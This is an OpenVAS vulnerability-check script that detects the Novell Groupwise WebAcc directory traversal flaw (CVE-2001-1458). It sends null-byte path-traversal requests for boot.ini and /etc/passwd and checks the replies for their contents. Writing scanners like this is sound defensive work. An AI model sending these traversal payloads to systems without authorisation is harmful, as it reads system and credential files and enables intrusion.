# OpenVAS Vulnerability Test
# $Id: novell_groupwise_webacc_information_disclosure.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Novell Groupwise WebAcc Information Disclosure
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2001 Noam Rathaus <noamr@securiteam.com>
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "Novell Groupwise WebAcc Servlet is installed. This servlet exposes 
critical system information, and allows remote attackers to read any file.";

tag_solution = "Disable access to the servlet until the author releases a patch.

Additional information:
http://www.securiteam.com/securitynews/6S00N0K2UM.html";


if(description)
{
 script_id(10789); 
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2001-1458");
 script_bugtraq_id(3436);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");

 name = "Novell Groupwise WebAcc Information Disclosure";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);

 summary = "Novell Groupwise WebAcc Information Disclosure";
 script_summary(summary);

 script_category(ACT_GATHER_INFO);

 script_copyright("This script is Copyright (C) 2001 SecuriTeam");
 family = "Web application abuses";
 script_family(family);

 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


url = string("/servlet/webacc");
installed = is_cgi_installed_ka(port:port, item:url);
if (installed)
{
# test NT systems
req = string("GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00 HTTP/1.0\r\n");
req = string(req, "User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n");
req = string(req, "Host: ", get_host_name(), "\r\n\r\n");

buf = http_keepalive_send_recv(port:port, data:req);
if( buf == NULL ) exit(0);
   
if ("[boot loader]" >< buf)
{
  security_hole(port:port);
  exit(0);
}


# test unix systems
req = string("GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.0\r\n");
req = string(req, "User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n");
req = string(req, "Host: ", get_host_name(), "\r\n\r\n");
buf = http_keepalive_send_recv(port:port, data:req);
if( buf == NULL ) exit(0);

if (egrep(pattern:"root:0:[01]:.*", string:buf))
  {
   security_hole(port:port);
   exit(0);
  }
  if("File does not exist" >< buf)
  {
   security_note(port:port);
  }
}
